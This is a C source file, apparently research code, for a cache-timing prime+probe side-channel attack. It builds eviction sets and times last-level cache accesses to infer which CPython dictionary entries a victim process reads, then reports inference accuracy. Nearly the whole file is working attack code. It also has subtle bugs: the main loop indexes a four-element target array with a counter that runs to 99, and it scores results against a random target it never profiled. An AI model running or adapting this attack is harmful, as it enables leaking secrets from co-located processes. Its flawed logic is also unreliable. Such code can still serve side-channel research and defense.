#include <stdbool.h>

#include "arch.h"
#include "config.h"
#include "log.h"
#include "prime_probe.h"
#include "Python.h"
#include "shared_memory.h"

static const char* dump_dir = "cpython_dict_profiling";
static const int max_exec_cycles = (int)1e6;
enum { cache_line_count = 1, profile_samples = 1 << 16 };
static uint64_t probe_time_arr[cache_line_count][profile_samples];
static uint64_t sample_tsc_arr[cache_line_count][profile_samples];
static uint64_t* sample_tsc[cache_line_count];
static uint64_t* probe_time[cache_line_count];
static const int dict_entries = 1 << 16;
static const int target_entries = 4;
static const int dict_iterations = 32;
static const int factor = 2;
static const int threshold = 8;

u32* profiles = NULL;

static bool check(u32 ctr) {
    return ctr >= dict_iterations / factor && ctr <= factor * dict_iterations;
}

static u32 cpython_PS_profile_once(EVSet* evset,
                                   int slot,
                                   uint64_t max_exec_cycles) {

    uint64_t tsc0, tsc1;
    uint8_t* scope = evset->addrs[0];
    evchain* sf_chain = evchain_build(evset->addrs, SF_ASSOC);

    u64 scope_lat, end;
    u32 aux, index = 0;
    u32 l2_repeat = 1, array_repeat = 12;
    i64 threshold = detected_cache_lats.l2_thresh;

    prime_skx_sf_evset_ps_flush(evset, sf_chain, array_repeat, l2_repeat);

    tsc0 = tsc1 = rdtscp();
    do {
        tsc1 = rdtscp();

        scope_lat = _time_maccess_aux(scope, end, aux);
        int scope_evict = scope_lat > threshold &&
                          scope_lat < detected_cache_lats.interrupt_thresh;
        if (scope_lat > threshold) {
            if (scope_lat < detected_cache_lats.interrupt_thresh) {
                probe_time[0][index] = scope_lat;
                sample_tsc[0][index] = tsc1;
                index++;
            }
            prime_skx_sf_evset_ps_flush(evset, sf_chain, array_repeat,
                                        l2_repeat);
        }
    } while (tsc1 - tsc0 < max_exec_cycles && index < profile_samples);

    tsc1 = mfence_rdtscp();

    log_trace("Client start done");
    return index;
}

static void profile(int i, int j) {
    config_t *cfg = get_config();

    for (int l3_set = 0; l3_set < cfg->l3.sets; ++l3_set) {
        if (l3_set % 1000 == 0) {
            log_info("%d: L3 set: %d", j, l3_set);
        }
        EVSet *evset = get_sf_kth_evset(l3_set);
        if (evset) {
            memset(sample_tsc_arr, 0, sizeof(sample_tsc_arr));
            memset(probe_time_arr, 0, sizeof(probe_time_arr));

            sync_ctx_set_action(SYNC_CTX_PROBE);
            *sync_ctx.data = i;

            pthread_barrier_wait(sync_ctx.barrier);

            u32 res = cpython_PS_profile_once(evset, 0, max_exec_cycles);

            if (sync_ctx_get_action() == SYNC_CTX_START) {
                log_warn("Insufficient profiler iterations");
            }

            pthread_barrier_wait(sync_ctx.barrier);

            profiles[j * cfg->l3.sets + l3_set] = res;

            dump_profiling_trace(dump_dir, j * cfg->l3.sets + l3_set, sample_tsc, probe_time,
                                 cache_line_count, profile_samples);
        } else {
            log_error("Cannot get evset for set %d", l3_set);
        }
    }
}

static int infer(int j) {
    config_t *cfg = get_config();

    u32 unique[target_entries];
    memset(unique, 0, target_entries * sizeof(u32));

    for (int l3 = 0; l3 < cfg->l3.sets; ++l3) {
        u32 ctr = profiles[j * cfg->l3.sets + l3];
        bool c = check(ctr);

        for (int i = 0; i < target_entries; ++i) {
            u32 tctr = profiles[i * cfg->l3.sets + l3];
            bool t = check(tctr);

            if (c != t) {
                unique[i]++;
            }
        }
    }

    int index = -1;

    for (int i = 0; i < target_entries; ++i) {
        log_info("%d: unique[%d] = %u", j, i, unique[i]);
        if (unique[i] <= threshold) {
            if (index != -1) {
                if (unique[i] < unique[index]) {
                    index = i;
                }
            } else {
                index = i;
            }
        }
    }

    return index;
}

int main(int argc, char* argv[]) {
    //iso_cpu();
    config_t* cfg = get_config();

    if (cache_env_init(1)) {
        log_error("Failed to initialize cache env!");
        return 0;
    }

    u32 l3_sets = cfg->l3.sets;
    u32 profile_size = l3_sets * (target_entries + 2);
    profiles = malloc(profile_size * sizeof(u32));
    memset(profiles, 0, profile_size * sizeof(u32));
    int skip = 0;

    EVSet* evset;
    helper_thread_ctrl hctrl;

    if (LLCF_multi_evset(0, &hctrl)) {
        log_error("Failed to build evset");
        return 0;
    }

    log_info("l2 thres %d, interrupt thres %d", detected_cache_lats.l2_thresh,
            detected_cache_lats.interrupt_thresh);

    if (start_helper_thread(&hctrl)) {
        log_error("Failed to start helper!\n");
        return 0;
    }

    for (int i = 0; i < cache_line_count; ++i) {
        sample_tsc[i] = sample_tsc_arr[i];
        probe_time[i] = probe_time_arr[i];
    }

    init_sync_ctx(CPYTHON_PROJ_ID);

    log_info("CPython loop barrier wait");
    pthread_barrier_wait(sync_ctx.barrier);

    int targets[target_entries];
    for (int i = 0; i < target_entries; ++i) {
        int target = 0;
        bool found = false;
        do {
            target = rand() % dict_entries;
            found = false;
            for (int j = 0; j < i; ++j) {
                if (target == targets[j]) {
                    found = true;
                    break;
                }
            }
        } while (found);
        targets[i] = target;
    }

    // Profiling
    for (int i = 0; i < target_entries; ++i) {
        profile(targets[i], i);
    }

    srand(time(NULL));

    int target_success = 0;
    int target_access = 0;
    int access_success = 0;

    for (int i = 0; i < 100; ++i) {
    	log_info("iteration: %d", i);
    	// Hit
    	int h = rand() % target_entries;
    	profile(targets[i], target_entries);

     	// Miss
     	int nh = 0;
        bool found = false;
        do {
        	nh = rand() % dict_entries;
            found = false;
            for (int j = 0; j < target_entries; ++j) {
                if (nh == targets[j]) {
                    found = true;
                    break;
                }
            }
       	} while (found);
      	profile(nh, target_entries + 1);

      	log_info("Hit at index %d (%d)", targets[i], i);
      	int hi = infer(target_entries);
        if (hi != -1) {
            target_access++;
        }
        if (hi == h) {
            target_success++;
            log_info("Correctly identfied target %d", h);
         } else {
            log_info("Incorrectly identfied target %d", hi);
         }


      	log_info("No hit at index %d", nh);
      	int ni = infer(target_entries + 1);
        if (ni == -1) {
           access_success++;
           log_info("Correctly identfied access");
        } else {
           log_info("Incorrectly identfied access %d", ni);
        }
    }

    log_info("Target success rate: %d", target_success);
    log_info("Target access success rate: %d", target_access);
    log_info("Access success rate: %d", access_success);

    sync_ctx_set_action(SYNC_CTX_EXIT);
    pthread_barrier_wait(sync_ctx.barrier);

    free(profiles);

    return 0;
}
